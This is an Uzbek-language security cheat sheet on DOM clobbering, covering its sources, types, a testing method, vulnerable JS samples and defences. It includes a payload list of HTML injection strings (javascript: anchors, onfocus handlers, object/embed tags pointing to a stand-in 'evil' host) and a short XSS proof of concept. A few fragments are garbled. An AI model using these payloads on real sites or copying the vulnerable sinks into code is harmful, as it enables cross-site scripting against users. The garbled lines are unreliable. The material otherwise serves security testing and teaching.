# DOM Clobbering

## 1. Ta'rif
DOM clobbering — HTML attribute (`id`, `name`) orqali JS global variable (`window`) qayta yozilishi. Attribute va global name bir xil bo'lsa — `window[var]` ko'proq HTML element'ga ko'rinadi. Attacker element qo'shib JS logikni buzadi → XSS, auth bypass, app funksiyani zaharlash.

## 2. Qayerdan kelib chiqadi
- JS `document.getElementById(id)`, `window[elemId]`, `someElement.name`
- Konflikt: HTML'da `<input name=config>`, `<img name=admin>` — `window.admin` element
- Sink: JS kod `if (window.user) {...}` deb tekshirdi — attacker `<a id=user href=...>` qo'yib true
- Form/iframe/anchors: `<a>` xususan (navigator properties). Iframe name → global (iframe hi-jack)
- Property Gadget: `element.accessKey`, `form.action`, `anchor.href`, `iframe.contentWindow`

## 3. Turlari
| Tur | Misol |
|-----|-------|
| Basic name/id conflict | `<img name=admin>` |
| Nested (form) | `<form name=a><input name=b>` → `a.b` |
| Anchor/property gadget | `<a id=config>` — `config.href` |
| iframe hijack | `<iframe name=config>` + importPath |
| Exotic forms | `<form name=a><input name=b>` her key ('b' input) |

## 4. Metodologiya
1. JS source'da `window[i]`, `document["name"]`, `id` qidiring; qaysi global'larga referens bor.
2. `window['foo']` element attribute bilan:
   - `<img id=foo>` → window.foo element
3. Nested: `<form id=a><input name=b>` → `window.a.b` = input.
4. Property being used: `href`, `action`, `src`, `value`, `title` — attribute bo'lsa set:
   - `<a id=redirect href=javascript:alert(1)>` → `pageUrl.href` → XSS
   - `<iframe name=x src ouvrir>` + `x.contentWindow` → cross-origin
5. Test JS:', console'da `window.<name>` — element qaytadimi.
6. XSS POC:
   ```html
   <a id=config href='javascript:alert(1)'>x</a>
   ```
   JS kodu `config.href` qiymatini innerHTML... sinkga kirganda.
7. `__proto__` clobber — JS + PP kombinatsiya.

## 5. Payload'lar
```
<img id="config">
<a id="config" href="javascript:alert(1)">x</a>
<iframe id="config"></iframe>
<form id="config"><input name="check" value="1"></form>
<a id="config" name="config"></a>
<object id="config" data="//evil/"></object>
<embed id="config" src="//evil/"></embed>
<input id="config" name="action" autofocus onfocus=alert(1)>
```
POC misol:
```
<input id=user value=1>   # JS: if (window.user && window.user.value=="1")
```

## 6. Zaif code misollari
```javascript
// ZAIF sink
if (window.user) {
  // attacker HTML qo'shdi: <input id=user> → true (NOT object!)
}
var url = window.config && window.config.href;   // <a id=config href=javascript:...>
innerHTML = url;    // XSS

// XAVFSIZ: typeof obj check, Object.prototype.hasOwn, never innerHTML internals
```
## 7. Nimalarga ahamiyat berish (checklist)
- [ ] JS'dagi global/global window refs — attribute mavjudmi
- [ ] `id` vs `name` — container/attribute
- [ ] Property gadget (href, action, src, contentWindow, accessKey)
- [ ] innerHTML / insertAdjacentHTML sink — output
- [ ] Framework (framework dropdown) useState clobbered
- [ ] DOM XSS kitablardan — DOM clobbering core XSS vector
- [ ] Form nested — `a.b` pattern
## 8. Himoya
- Use `document.getElementById` correctly (`===` check for proper object)
- Validate types (typeof) before property access; `Object.freeze`
- CSP + no-unsafe-inline blocks XSS; sanitize HTML sink attributes
- Never trust `window` globals (use const/let); scope yours own config